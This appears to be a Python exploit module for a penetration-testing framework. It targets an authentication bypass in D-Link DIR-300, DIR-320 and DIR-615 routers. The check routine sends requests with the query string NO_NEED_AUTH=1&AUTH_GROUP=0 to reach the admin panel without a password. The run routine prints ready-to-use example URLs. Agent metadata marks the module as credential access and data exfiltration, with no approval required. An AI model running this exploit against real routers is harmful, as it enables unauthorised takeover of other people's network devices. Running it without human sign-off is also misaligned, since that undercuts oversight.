#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-300 & DIR-320 & DIR-615 Auth Bypass"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'D-Link DIR-300 & DIR-320 & DIR-615 Auth Bypass',
        'description': 'Module exploits authentication bypass vulnerability in D-Link DIR-300, DIR-320, DIR-615 revD devices. It is possible to access administration panel without providing password.',
        'author': ['Craig Heffner', 'Karol Celin', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf'],
        'tags': ['iot', 'router', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_info("\nYou need to add NO_NEED_AUTH=1&AUTH_GROUP=0 to query string for every action.")
            print_info("\nExamples:")
            print_info("{}:{}/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0".format(self.target, self.port))
            print_info("{}:{}/bsc_wlan.php?NO_NEED_AUTH=1&AUTH_GROUP=0\n".format(self.target, self.port))
        else:
            print_error("Target seems to be not vulnerable")
    def check(self):
        # check if it is valid target
        response = self.http_request(
            method="GET",
            path="/bsc_lan.php"
        )
        if response is None:
            return False  # target is not vulnerable

        if '<form name="frm" id="frm" method="post" action="login.php">' not in response.text:
            return False  # target is not vulnerable

        # checking if authentication can be baypassed
        response = self.http_request(
            method="GET",
            path="/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0"
        )
        if response is None:
            return False  # target is not vulnerable

        if '<form name="frm" id="frm" method="post" action="login.php">' not in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
